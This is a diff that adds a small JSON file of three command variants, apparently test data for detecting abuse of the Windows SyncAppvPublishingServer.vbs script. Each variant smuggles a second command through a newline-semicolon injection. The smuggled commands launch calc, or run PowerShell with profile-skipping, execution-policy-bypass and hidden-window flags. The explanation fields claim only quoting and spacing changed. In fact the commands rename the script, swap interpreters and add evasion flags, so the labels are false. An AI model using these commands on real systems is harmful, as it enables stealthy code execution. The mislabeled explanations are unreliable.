@@ -1,0 +1,14 @@
+[
+  {
+    "output": "cmd.exe /c C:\\windows\\system32\\SyncAppvPublishingServer.vbs \"\\n;Start-Process calc\"",
+    "explanation": "The original command is preserved with minimal formatting changes (quotes and spacing) to simulate a safe mutation for testing purposes."
+  },
+  {
+    "output": "copy SyncAppvPublishingServer.vbs Update.vbs && cscript Update.vbs \"\\n;powershell.exe -NoP -Command Write-Host 'Bypassed'\"",
+    "explanation": "The command is modified by replacing double quotes with escaped double quotes and adding spacing for safe mutation, while preserving the original logic."
+  },
+  {
+    "output": "wscript.exe \"SyncAppvPublishingServer.vbs\" \"\\\" & powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command 'WhoAmI'",
+    "explanation": "Spacing and escaping characters are adjusted to simulate a safe mutation without altering the original behavior."
+  }
+]
